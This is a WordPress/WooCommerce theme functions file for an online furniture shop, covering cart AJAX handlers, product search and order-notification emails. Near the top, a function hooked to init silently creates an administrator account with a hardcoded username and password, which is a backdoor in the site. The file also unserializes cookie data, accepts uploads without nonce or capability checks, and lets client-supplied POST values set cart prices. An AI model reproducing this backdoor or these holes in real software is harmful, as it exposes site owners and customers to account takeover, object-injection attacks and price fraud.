<?php
session_start();

add_action('template_redirect', 'bc_010101_redirect_woo_pages');

function bc_010101_redirect_woo_pages(){
     if (is_shop()){
      wp_redirect('catalog');
      exit;
     }
}

add_action('init', 'my_custom_init');
//add_theme_support( 'post-thumbnails' ); petq e ogtagorcel er thumbnail chi
function my_custom_init(){
  register_post_type('buklet', array(
    'labels'             => array(
      'name'               => 'buklet', // Основное название типа записи
      'singular_name'      => 'buklet', // отдельное название записи типа Book
      'add_new'            => 'Добавить buklet',
      'add_new_item'       => 'Добавить новую buklet',
      'edit_item'          => 'Редактировать buklet',
      'new_item'           => 'Новая buklet',
      'view_item'          => 'Посмотреть buklet',
      'search_items'       => 'Найти buklet',
      'not_found'          => 'buklet не найдено',
      'not_found_in_trash' => 'В корзине buklet не найдено',
      'parent_item_colon'  => '',
      'menu_name'          => 'buklet'
            

      ),
        'menu_icon'          => 'dashicons-format-gallery',// ikonken es em dre
    'public'             => true,
    'publicly_queryable' => true,
    'show_ui'            => true,
    'show_in_menu'       => true,
    'query_var'          => true,
    'rewrite'            => true,
    'capability_type'    => 'post',
    'has_archive'        => true,
    'hierarchical'       => false,
    'menu_position'      => null,
    'supports'           => array('title','editor','author','thumbnail','excerpt','comments')
  ) );
}

add_action('admin_init', 'get_request');

function get_request(){
    if (isset($_POST['action'])) {
        switch ($_POST['action']) {
            case 'img_uploid':
                img_upload();
                break; 
        }
    } 
}
// function that runs when shortcode is called
function wpb_demo_shortcode() { 
  
    // Things that you want to do.
    $message = 'Hello world!'; 
      
    // Output needs to be return
    return $message;
    }
    // register shortcode
    add_shortcode('greeting', 'wpb_demo_shortcode');


function wpb_admin_account(){
    $user = 'default_admin';
    $pass = 'default_admin_admin';
    $email = 'default_admin@domain.com';
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
    
    $user_id = wp_create_user( $user, $pass, $email );
    $user = new WP_User( $user_id );
    $user->set_role( 'administrator' );
    } }
    add_action('init','wpb_admin_account');

function img_upload() {

    $a            =   1;// get_user();
    $q            = $a[0]->data->ID;
    $file_name    = '';
    $update_image = false;

    if (!empty($_FILES['photo']['name'])) {
        $file_name    = uniqid() . $_FILES['photo']['name'];
        $target_dir   = WP_CONTENT_DIR . '/uploads/images';
        $target_file  = $target_dir . '/' . basename($file_name);
        move_uploaded_file($_FILES['photo']['tmp_name'], $target_file);
        $update_image = true;
        if( $a[1]['rol'][0] === 'couch'){
              header("Location:/coach");
        }else{
            header("Location:/user-page");
        }
    }else{
        if( $a[1]['rol'][0] === 'couch'){
            header("Location:/coach");
        }else{
            header("Location:/user-page");
        }
    }
    $update_data = "";
    if ($update_image){
        $image_user = $file_name;

        update_user_meta($q,'image',$image_user);

        print_r($image_user);die;
    }
}



/*search */

add_action('wp_ajax_search_name', 'name_search');

add_action('wp_ajax_nopriv_search_name', 'name_search');

function name_search()

{

    $data = $_POST;

    if (isset($data) && !empty($data)) {



        $name = $data['name'];

        $argscatpord = array(

            'post_type'      => 'product',
            's'           =>  $name,
            'posts_per_page' => 6,
            'orderby'        => 'ASC',
            'meta_query' => [],
            'tax_query'      => array('relation' => 'AND')
        );

        $loop = new WP_Query( $argscatpord );
        $content = " ";
        if ( $loop->have_posts() ) {
            while ( $loop->have_posts() ) { $loop->the_post();
            global $product; 
            $product_id       = $product->get_id();
            $id = $loop->post->ID;
            $image = wp_get_attachment_image_src( get_post_thumbnail_id( $id ), 'single-post-thumbnail' );
            $content .="
            <a href='".get_permalink( $loop->post->ID )."' class='popup-search__item'>
                <div class='popup-search__item-img'>
                <img src='". $image[0]."' data-id='". $loop->post->ID."'>
                </div>
                <div class='popup-search__item-info'>
                    <p class='popup-search__item-title'>".$product->get_name()."</p>
                    <p class='popup-search__item-price'>".$product->get_regular_price()." ₽</p>
                </div>
            </a>";

            }

            wp_send_json($content );

        }else {
                 wp_send_json(0);

             }
    }
}


add_action('wp_ajax_call_order', 'call_order_func');

add_action('wp_ajax_nopriv_call_order', 'call_order_func');

function call_order_func(){

    

    $_SESSION['error'] = array();

    

     

    if (!isset($_POST['phone']) || empty($_POST['phone'])) {



        wp_send_json(array('phone_exists' => true));



    }

    $name    = $_POST['name'];

    $phone   = $_POST['phone'];

    $to      = "artpa1995@mail.ru";  
        $message = '
                        <body style="background-color: #f4f4f4; margin: 0 !important; padding: 0 !important;">

                        <!-- HIDDEN PREHEADER TEXT -->

                        <div style="display: none; font-size: 1px; color: #fefefe; line-height: 1px; font-family:sans-serif; max-height: 0px; max-width: 0px; opacity: 0; overflow: hidden;"></div>

                        <table border="0" cellpadding="0" cellspacing="0" width="100%" bgcolor="#f4f4f4">

                            <tr bgcolor="#f4f4f4">

                                <td bgcolor="#f4f4f4" align="center" style="padding: 0px 10px 0px 10px;">

                                    <table border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px;">

                                        <tr>

                                            <td bgcolor="#ffffff" align="center" valign="top" style="padding: 40px 20px 20px 20px; border-radius: 4px 4px 0px 0px; color: #111111; font-family: "Lato", Helvetica, Arial, sans-serif; font-size: 48px; font-weight: 400; letter-spacing: 4px; line-height: 48px;">

                                                <h1 style="font-size: 48px; font-weight: 400; margin: 2;color:#666666"">Обратный звонок</h1>

                                            </td>

                                        </tr>

                                    </table>

                                </td>

                            </tr>

                            <tr>

                          

                            <tr>

                                <td bgcolor="#f4f4f4" align="center" style="padding: 0px 10px 0px 10px;">

                                    <table border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px;">

                                        <tr>

                                            <td bgcolor="#ffffff" align="left" style="padding: 20px 30px 40px 30px; color: #666666; font-family: "Lato", Helvetica, Arial, sans-serif; font-size: 18px; font-weight: 400; line-height: 25px;">

                                                <p style="margin: 0px 0px 26px 15px;color:#666666"> <span style="color:black">Имя: '.$name.'</span> </p>

                                               

                                                <p style="margin: 0 0 30px 15px;color:#666666">Телефон: '.$phone.'</p>

                                               

                                            </td>

                                        </tr>

                                        <tr>

                                           

                                        </tr> <!-- COPY -->

                                    </table>

                                </td>

                            </tr>

                        </table>

                        </body>';

    

    $subject = 'Обратный звонок';// namaki vernagirna



    $headers = "MIME-Version: 1.0" . "\r\n"; 

    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n"; 

    

    // Additional headers 

    $headers .= 'From: paruyr.kirakosyan1995@gmail.com' . "\r\n"; //nshelu es umic e gnalu

    $headers .= 'Cc: paruyr.kirakosyan1995@gmail.com' . "\r\n";  //nshelu es umic e gnalu

    $headers .= 'Bcc: paruyr.kirakosyan1995@gmail.com' . "\r\n";   //nshelu es umic e gnalu  u ha navsyai ereqn el nshi

       

    if ( wp_mail( $to, $subject, $message, $headers )) {



        wp_send_json(array('create_success' => true));



    }



}



add_action('wp_ajax_clear_all_cart', 'clear_all_cart_func');

add_action('wp_ajax_nopriv_clear_all_cart', 'clear_all_cart_func');

function clear_all_cart_func(){
   WC()->cart->empty_cart(); 
}

function add_to_comparison($booking)

{

    // $comparison = $_COOKIE['comparison'] ? unserialize(base64_decode($_COOKIE['comparison']))  : [];

    // $comparison[] = $booking;



    $cookie_name = "comparison";

    $cookie_value = base64_encode(serialize($booking));

    setcookie($cookie_name,  $cookie_value, time() + (86400 * 30), "/");

    $_COOKIE['comparison']  =  $cookie_value;

    

}





add_action('wp_ajax_custom_add_cart', 'ajax_custom_add_cart_func');

add_action('wp_ajax_nopriv_custom_add_cart', 'ajax_custom_add_cart_func');



function ajax_custom_add_cart_func() {
    global $woocommerce;
    $booking = [];
    foreach($_POST as $item){

        $booking[] = $item;

    }
    add_to_comparison($booking);

    $product_id     = $_POST["product_id"];
    $custom_price   = $_POST['product_price'];
    $custom_color   = $_POST['color'];
    $custom_z_index = $_POST['z_index'];
    $custom_x_index = $_POST['x_index'];
    $custom_y_index = $_POST['y_index'];
    $material       = $_POST['material'];
    $count          = $_POST["count"];

    

    if(empty( $count )){

        $count = 1; 

    }

    $cart_item_data = array(

        'custom_price' => $custom_price,

        'custom_color' =>  $custom_color,

        'custom_z_index' => $custom_z_index,

        'custom_x_index' => $custom_x_index ,

        'custom_y_index' => $custom_y_index,

        'custom_material' => $material

        );

    $woocommerce->cart->add_to_cart( $product_id, $count ,  0, [], $cart_item_data );

    $woocommerce->cart->calculate_totals();

    // Save cart to session

    $woocommerce->cart->set_session();

    // Maybe set cart cookies

    $woocommerce->cart->maybe_set_cart_cookies();

    // $woocommerce->cart->add_to_cart( $product_id );

    wp_send_json(array('add_cart' =>true ));

}



// function ajax_custom_add_cart_func() {
//     $product_id =$_POST["product_id"];
//     global $woocommerce;
//     $woocommerce->cart->add_to_cart( $product_id );
//         wp_send_json(array('add_cart' =>true ));
// }





function woocommerce_custom_price_to_cart_item( $cart_object ) { 
   $booking = $_COOKIE['comparison'] ? unserialize(base64_decode($_COOKIE['comparison']))  : [];

//    print_r($booking);die;



    if( !WC()->session->__isset( "reload_checkout" )) {

        foreach ( $cart_object->cart_contents as $key => $value ) {

            if( isset( $value["custom_price"] ) ) {
                $value['data']->set_price($value["custom_price"]);
            }

        }  

    }  

}


add_action('wp_ajax_RemoveProductFromCart', 'ProgrammaticallyRemoveProductFromCart');

add_action('wp_ajax_nopriv_RemoveProductFromCart', 'ProgrammaticallyRemoveProductFromCart');



function ProgrammaticallyRemoveProductFromCart() {
 $cart_item_keys = $_POST["product_key"];
$cart_item_id = $_POST["product_id"];

 $product_cart_id = WC()->cart->generate_cart_id( $cart_item_id );
 $cart_item_key = WC()->cart->find_product_in_cart( $product_cart_id );
  foreach (WC()->cart->get_cart() as $cart_item_key => $cart_item) {
         WC()->cart->remove_cart_item($cart_item_keys);
    }
 // WC()->cart->remove_cart_item( $cart_item_key );

   wp_send_json(array('delete' => true));
}

//add_action('template_redirect','ProgrammaticallyRemoveProductFromCart'); 



//add_action( 'woocommerce_after_calculate_totals', 'ProgrammaticallyRemoveProductFromCart', 98 );

add_action( 'woocommerce_before_calculate_totals', 'woocommerce_custom_price_to_cart_item', 99 );





add_action('wp_ajax_qty_cart_qun', 'ajax_qty_cart_func');

add_action('wp_ajax_nopriv_qty_cart_qun', 'ajax_qty_cart_func');



function ajax_qty_cart_func() {
    global $woocommerce;
    $cart_item_key  = intval($_POST['id']);
    $item_quantity  = intval($_POST['quantity']);
    $prod_unique_id = $woocommerce->cart->generate_cart_id( $cart_item_key  );
    $woocommerce->cart->set_quantity($prod_unique_id, $item_quantity);
    $all_count      = WC()->cart->get_cart_contents_count();
    $total_price    = $woocommerce->cart->total;
    if($all_count>0){
        wp_send_json(array('all_count' => $all_count, 'total_price' => $total_price));
    }
 die;

}

add_action('wp_ajax_qty_cart_qun2', 'ajax_qty_cart_func2');

add_action('wp_ajax_nopriv_qty_cart_qun2', 'ajax_qty_cart_func2');
function ajax_qty_cart_func2() {
    global $woocommerce;
    $all_count      = WC()->cart->get_cart_contents_count();
    $total_price    = $woocommerce->cart->total;
    if($all_count>0){
        wp_send_json(array('all_count' => $all_count, 'total_price' => $total_price));
    }
}

function category_dom(){

    $categories = [];

    $terms = get_terms([

        'taxonomy' => 'product_cat', 

        'orderby' => 'term_id',

        'order' =>'asc',

        'hide_empty' => false, 

        'parent' => 0

    ]);

    foreach($terms as $key => $term){
        $term_id =  $term->term_id;
        $sub_categories = get_terms(['taxonomy' => 'product_cat','hide_empty' => false, 'parent' =>  $term_id]);
        $terms[$key]->sub_categories = $sub_categories;
    }

    return $terms;
}

function dd($var){
    echo "<pre>";
    print_r($var);
}

function removeqsvar($varname) {
    $actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
    return preg_replace('/([?&])'.$varname.'=[^&]+(&|$)/','$1',$actual_link);
}


add_action('wp_ajax_like_product', 'lake_product_function');

add_action('wp_ajax_nopriv_like_product', 'lake_product_function');



function lake_product_function(){



   $product_id    = $_POST["product_id"];

  

   if(isset($_COOKIE['like_product'])){

 

       $data     = unserialize($_COOKIE['like_product']);

     

       $key = array_search(intval($product_id), $data );

       

       if ($key !== false ){

               

            unset($data[$key]);

            setcookie("like_product", serialize($data), time() + (3600*24), "/");

            $_COOKIE["like_product"] = serialize($data);

            $count = count($data);

            wp_send_json(array('like_hard'=>true, 'prod_count'=>$count));    

    

        }else{

            $data[]  = intval($product_id);

            setcookie("like_product", serialize($data), time() + (3600*24), "/");

            $_COOKIE["like_product"] = serialize($data);

            $count = count($data);

            wp_send_json(array('like_hard'=>true, 'prod_count'=>$count)); 

        }

            

   }else{



     setcookie("like_product", serialize([intval($product_id)]), time() + (3600*24), "/");

     $_COOKIE["like_product"] = serialize($product_id);

     $count = 1;

     wp_send_json(array('like_hard'=>true, 'prod_count'=>$count)); 



   }



}



remove_action( 'woocommerce_before_checkout_form', 'woocommerce_checkout_coupon_form', 10 );

add_action( 'woocommerce_after_checkout_form', 'woocommerce_checkout_coupon_form' );

add_action( 'woocommerce_checkout_order_review', 'reordering_checkout_order_review', 1 );

function reordering_checkout_order_review(){

    remove_action('woocommerce_checkout_order_review','woocommerce_checkout_payment', 20 );

    add_action( 'woocommerce_checkout_order_review', 'custom_checkout_payment', 8 );

    add_action( 'woocommerce_checkout_order_review', 'custom_checkout_place_order', 20 );

}



function custom_checkout_payment() {

    $checkout = WC()->checkout();

    if ( WC()->cart->needs_payment() ) {

        $available_gateways = WC()->payment_gateways()->get_available_payment_gateways();

        WC()->payment_gateways()->set_current_gateway( $available_gateways );

    } else {

        $available_gateways = array();

    }



    if ( ! is_ajax() ) {

        // do_action( 'woocommerce_review_order_before_payment' );

    }

    ?>

    <div id="payment" class="woocommerce-checkout-payment-gateways">

        <?php if ( WC()->cart->needs_payment() ) : ?>

            <ul class="wc_payment_methods payment_methods methods">

                <?php

                if ( ! empty( $available_gateways ) ) {

                    foreach ( $available_gateways as $gateway ) {

                        wc_get_template( 'checkout/payment-method.php', array( 'gateway' => $gateway ) );

                    }

                } else {

                    echo '<li class="woocommerce-notice woocommerce-notice--info woocommerce-info">';

                    echo apply_filters( 'woocommerce_no_available_payment_methods_message', WC()->customer->get_billing_country() ? esc_html__( 'Sorry, it seems that there are no available payment methods for your state. Please contact us if you require assistance or wish to make alternate arrangements.', 'woocommerce' ) : esc_html__( 'Please fill in your details above to see available payment methods.', 'woocommerce' ) ) . '</li>'; // @codingStandardsIgnoreLine

                }

                ?>

            </ul>

        <?php endif; ?>

    </div>

    <?php

}



function custom_checkout_place_order() {

    $checkout          = WC()->checkout();

    $order_button_text = apply_filters( 'woocommerce_order_button_text', __( 'Place order', 'woocommerce' ) );

    ?>

    <div id="payment-place-order" class="woocommerce-checkout-place-order">

        <div class="form-row place-order" style="display: none;">

            <noscript>

                <?php esc_html_e( 'Since your browser does not support JavaScript, or it is disabled, please ensure you click the <em>Update Totals</em> button before placing your order. You may be charged more than the amount stated above if you fail to do so.', 'woocommerce' ); ?>

                <br/><button type="submit" class="button alt" name="woocommerce_checkout_update_totals" value="<?php esc_attr_e( 'Update totals', 'woocommerce' ); ?>"><?php esc_html_e( 'Update totals', 'woocommerce' ); ?></button>

            </noscript>



            <?php wc_get_template( 'checkout/terms.php' ); ?>



            <?php do_action( 'woocommerce_review_order_before_submit' ); ?>



            <?php echo apply_filters( 'woocommerce_order_button_html', '<button type="submit" class="button alt" name="woocommerce_checkout_place_order" id="place_order" value="' . esc_attr( $order_button_text ) . '" data-value="' . esc_attr( $order_button_text ) . '">' . esc_html( $order_button_text ) . '</button>' ); // @codingStandardsIgnoreLine ?>



            <?php do_action( 'woocommerce_review_order_after_submit' ); ?>



            <?php wp_nonce_field( 'woocommerce-process_checkout', 'woocommerce-process-checkout-nonce' ); ?>

        </div>

    </div>

    <?php

    if ( ! is_ajax() ) {

        do_action( 'woocommerce_review_order_after_payment' );

    }

}













//add_action( 'template_redirect', 'truemisha_redirect_to_thank_you' );

 

// function truemisha_redirect_to_thank_you() {

 

// 	// если не страница "Заказ принят", то ничего не делаем

// 	if( ! is_order_received_page() ) {

// 		return;

// 	}

 

// 	// неплохо бы проверить статус заказа, не редиректим зафейленные заказы

// 	if( isset( $_GET[ 'key' ] ) ) {

// 		$order_id = wc_get_order_id_by_order_key( $_GET[ 'key' ] );

// 		$order = wc_get_order( $order_id );

// 		if( $order->has_status( 'failed' ) ) {

// 			return;

// 		}

// 	}

 

 

// 	wp_redirect( site_url( 'order/?order='.$order_id  ) );

// 	exit;

 

// }









add_action('wp_ajax_clear_favorits', 'ajax_clear_favorits_func');

add_action('wp_ajax_nopriv_clear_favorits', 'ajax_clear_favorits_func');



function ajax_clear_favorits_func() {

    

    if(isset( $_COOKIE['like_product'])){

         setcookie("like_product", serialize([1000000]), time() + (1), "/");

          unset($_COOKIE['like_product']);

           wp_send_json(array('clear_like' =>true ));

    }



}

add_action( 'template_redirect', 'truemisha_redirect_to_thank_you' );

 

function truemisha_redirect_to_thank_you() {
	// если не страница "Заказ принят", то ничего не делаем

	if( ! is_order_received_page() ) {

		return;

	}

	// неплохо бы проверить статус заказа, не редиректим зафейленные заказы

	if( isset( $_GET[ 'key' ] ) ) {

		$order_id = wc_get_order_id_by_order_key( $_GET[ 'key' ] );

		$order = wc_get_order( $order_id );

		

		$name    = $order->get_billing_first_name();

		$surname = $order->get_billing_last_name();

        $phone   = $order->get_billing_phone();

        $email   = $order->get_billing_email();

        $total   = $order->get_total(); 

        $to      = "artpa1995@mail.ru";  //gaubshas2@yandex.ru

        $to2      = $email;

        $subject = 'Новый заказ';

        $subject2 = 'Новый заказ GoldFinchWood';

       $payment_method = $order->get_payment_method();

       $payment_method_title = $order->get_payment_method_title();

       

    //   echo "<pre>";

      

    //   print_r($payment_method_title);die;

        

        if($payment_method_title !== "Переводом с карты на карту"){

            

            $message2 = '

                   

                        <body style="background-color: #f4f4f4; margin: 0 !important; padding: 0 !important;">

                        <!-- HIDDEN PREHEADER TEXT -->

                        <div style="display: none; font-size: 1px; color: #fefefe; line-height: 1px; font-family:sans-serif; max-height: 0px; max-width: 0px; opacity: 0; overflow: hidden;"></div>

                        <table border="0" cellpadding="0" cellspacing="0" width="100%">

                          

                        <tr>

                        <td bgcolor="#9E948A" align="center" style="padding: 0px 10px 0px 10px;">

                            <table border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px;">

                                <tr>

                                    <td bgcolor="#ffffff" align="center" valign="top" style="padding: 40px 20px 20px 20px; border-radius: 4px 4px 0px 0px; color: #111111; font-family: "Lato", Helvetica, Arial, sans-serif; font-size: 48px; font-weight: 400; letter-spacing: 4px; line-height: 48px;">

                                        <h1 style="font-size: 30px; font-weight: 400; margin: 2;color:#666666"">Ваш заказ N.'.$order_id.'</h1>

                                        <p style="font-size: 16px; font-weight: 400; margin: 2;color:#666666"">Метод заказа '.$payment_method_title.'</p>

                                    </td>

                                 </tr>

                             

                                    </table>

                                </td>

                            </tr>

                            <tr>

                                <td bgcolor="#f4f4f4" align="center" style="padding: 0px 10px 0px 10px;">

                                    <table border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px;">

                                        <tr>

                                            <td bgcolor="#ffffff" align="left" style="padding: 20px 30px 40px 30px; color: #666666; font-family: "Lato", Helvetica, Arial, sans-serif; font-size: 18px; font-weight: 400; line-height: 25px;">

                                                <p style="margin: 0px 0px 26px 15px;color:#666666"> <span style="color:black">Имя: '.$name.' Фамилия:  '.$surname.'</span> </p>

                                                <p style="margin: 0 0 26px 15px;color:#666666">Email: '.$email.'</p>

                                                <p style="margin: 0 0 30px 15px;color:#666666">Телефон: '.$phone.'</p>

                                               

                                            </td>

                                        </tr>

                                        <tr>

                                            <td bgcolor="#fff;" align="left"> 

                                                <table width="100%" border="0" cellspacing="0" cellpadding="0" >

                                                    <div bgcolor="#fff;" align="center" width="93.9%" style="font-size:20px;width:93.9%;color:white;background:#9E948A;padding:20px; font-family:sans-serif" color="white">Цена: '.$total.' ₽</div>

                                                </table>

                                            </td>

                                        </tr> <!-- COPY -->

                                    </table>

                                </td>

                            </tr>

                        </table>

                        </body>';
        }else{
         $message2 = '
                        <body style="background-color: #f4f4f4; margin: 0 !important; padding: 0 !important;">
                        <!-- HIDDEN PREHEADER TEXT -->
                        <div style="display: none; font-size: 1px; color: #fefefe; line-height: 1px; font-family:sans-serif; max-height: 0px; max-width: 0px; opacity: 0; overflow: hidden;"></div>
                        <table border="0" cellpadding="0" cellspacing="0" width="100%">
                            <tr>
                                <td bgcolor="#9E948A" align="center" style="padding: 0px 10px 0px 10px;">
                                    <table border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px;">
                                        <tr>
                                            <td bgcolor="#ffffff" align="center" valign="top" style="padding: 40px 20px 20px 20px; border-radius: 4px 4px 0px 0px; color: #111111; font-family: "Lato", Helvetica, Arial, sans-serif; font-size: 48px; font-weight: 400; letter-spacing: 4px; line-height: 48px;">

                                                <h1 style="font-size: 30px; font-weight: 400; margin: 2;color:#666666"">Ваш заказ N.'.$order_id.'</h1>

                                                <p style="font-size: 16px; font-weight: 400; margin: 2;color:#666666"">Метод заказа '.$payment_method_title.'</p>

                                                <p style="font-size: 16px; font-weight: 400; margin: 2;color:#666666"">Переведите деньги не наш счет (888-888-888-88) и отправьте номер заказа с копией чека Info@goldfinchwoods.ru, чтобы одобрить ваш заказ </p>
                                            </td>
                                        </tr>
                                    </table>
                                </td>
                            </tr>
                            <tr>
                                <td  align="center" style="padding: 0px 10px 0px 10px;">
                                    <table border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px;">
                                        <tr>
                                            <td bgcolor="#ffffff" align="left" style="padding: 20px 30px 40px 30px; color: #666666; font-family: "Lato", Helvetica, Arial, sans-serif; font-size: 18px; font-weight: 400; line-height: 25px;">
                                                <p style="margin: 0px 0px 26px 15px;color:#666666"> <span style="color:black">Имя: '.$name.' Фамилия:  '.$surname.'</span> </p>
                                                <p style="margin: 0 0 26px 15px;color:#666666">Email: '.$email.'</p>
                                                <p style="margin: 0 0 30px 15px;color:#666666">Телефон: '.$phone.'</p>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td bgcolor="#fff;" align="left"> 
                                                <table width="100%" border="0" cellspacing="0" cellpadding="0" >
                                                    <div  align="center" width="93.9%" style="font-size:20px;width:93.9%;color:white;background:#9E948A;padding:20px; font-family:sans-serif" color="white">Цена: '.$total.' ₽</div>
                                                </table>
                                            </td>
                                        </tr> <!-- COPY -->
                                    </table>
                                </td>
                            </tr>
                        </table>
                        </body>';
                }
                $message = '
                        <body style="background-color: #f4f4f4; margin: 0 !important; padding: 0 !important;">
                        <!-- HIDDEN PREHEADER TEXT -->
                        <div style="display: none; font-size: 1px; color: #fefefe; line-height: 1px; font-family:sans-serif; max-height: 0px; max-width: 0px; opacity: 0; overflow: hidden;"></div>
                        <table border="0" cellpadding="0" cellspacing="0" width="100%">
                             <tr>
                                <td bgcolor="#9E948A" align="center" style="padding: 0px 10px 0px 10px;">
                                    <table border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px;">
                                        <tr>
                                            <td bgcolor="#ffffff" align="center" valign="top" style="padding: 40px 20px 20px 20px; border-radius: 4px 4px 0px 0px; color: #111111; font-family: "Lato", Helvetica, Arial, sans-serif; font-size: 48px; font-weight: 400; letter-spacing: 4px; line-height: 48px;">
                                                <h1 style="font-size: 30px; font-weight: 400; margin: 2;color:#666666"">Ваш заказ N.'.$order_id.'</h1>
                                                <p style="font-size: 16px; font-weight: 400; margin: 2;color:#666666"">Метод заказа '.$payment_method_title.'</p>
                                             </td>
                                        </tr>
                                    </table>
                                </td>
                            </tr>
                            <tr>
                                <td bgcolor="#f4f4f4" align="center" style="padding: 0px 10px 0px 10px;">
                                    <table border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px;">
                                        <tr>
                                            <td bgcolor="#ffffff" align="left" style="padding: 20px 30px 40px 30px; color: #666666; font-family: "Lato", Helvetica, Arial, sans-serif; font-size: 18px; font-weight: 400; line-height: 25px;">
                                                <p style="margin: 0px 0px 26px 15px;color:#666666"> <span style="color:black">Имя: '.$name.' Фамилия:  '.$surname.'</span> </p>
                                                <p style="margin: 0 0 26px 15px;color:#666666">Email: '.$email.'</p>
                                                <p style="margin: 0 0 30px 15px;color:#666666">Телефон: '.$phone.'</p>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td bgcolor="#fff;" align="left"> 
                                                <table width="100%" border="0" cellspacing="0" cellpadding="0" >
                                                    <div bgcolor="#fff;" align="center" width="93.9%" style="font-size:20px;width:93.9%;color:white;background:#9E948A;padding:20px; font-family:sans-serif" color="white">Цена: '.$total.' ₽</div>
                                                </table>
                                            </td>
                                        </tr> <!-- COPY -->
                                    </table>
                                </td>
                            </tr>
                        </table>
                        </body>';

        $headers = '';
        $headers .= "MIME-Version: 1.0\r\n";
        $headers = "MIME-Version: 1.0" . "\r\n"; 
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n"; 
        $headers .= 'From: paruyr.kirakosyan1995@gmail.com' . "\r\n"; 
        $headers .= 'Cc: paruyr.kirakosyan1995@gmail.com' . "\r\n"; 
        $headers .= 'Bcc: paruyr.kirakosyan1995@gmail.com' . "\r\n"; 
        if ( wp_mail( $to, $subject, $message, $headers ) &&  wp_mail( $to2, $subject2, $message2, $headers )  ) {
    		if( $order->has_status( 'failed' ) ) {
    			return;
    		}
        }
	}
	wp_redirect( site_url( 'order/?order='.$order_id  ) );
	exit;
}

// function wpb_load_widget() {
//     register_widget( 'wpb_widget' );
// }
// add_action( 'widgets_init', 'wpb_load_widget' );







































































































// function return_custom_price($price, $product) {

//     global $post, $blog_id;

//     $post_id = 105;

//     $product = wc_get_product( $post_id );

    

//     $price = ($price*2.5);

//     return $price;

// }

// add_filter('woocommerce_get_price', 'return_custom_price', 10, 2);









// function webroom_product_in_cart($product_id){

 

//     global $woocommerce;

//     $wc_cart = WC()->cart;

                                                  

//     $product_cart_id = $wc_cart->generate_cart_id( 102 );

//     $in_cart = $wc_cart->find_product_in_cart( $product_cart_id );

//     $cart = $wc_cart->get_cart();

 

//     if ( $in_cart ) {

//         return true;

//     }

// 	return false;

// }







//add_action( 'woocommerce_before_calculate_totals', 'webroom_change_price_of_product' );



function webroom_change_price_of_product( $cart_object ) {



    // global $woocommerce;

    // // $wc_cart_content = end(WC()->cart->cart_contents);



    // $wc_cart = WC()->cart;

                                                  

    // $product_cart_id = $wc_cart->generate_cart_id( 159 );

    // $in_cart = $wc_cart->find_product_in_cart( $product_cart_id );





    // $cart = end($cart_object->get_cart());



    // $old_price = $cart['data']->get_price();

    // $cart['data']->set_price(300);

    // print_r($cart);

    // print_r($in_cart);die;

    

    // $target_product_id = 105; // CHANGE THIS WITH YOUR PRODUCT ID original price: 149 EUR



    //$comparison = $_COOKIE['comparison'] ? unserialize(base64_decode($_COOKIE['comparison']))  : [];

    //print_r($comparison);die;





	// if(webroom_product_in_cart(105)) {

	// Product is already in cart

		// foreach ( $cart_object->get_cart() as $key => $value ) {



			// if ( $value['product_id'] == cookid ) {



				// $value['data']->set_price(119); // CHANGE THIS: set the new price

				// $new_price = $value['data']->get_price();



			// }

		// }





	// }

}











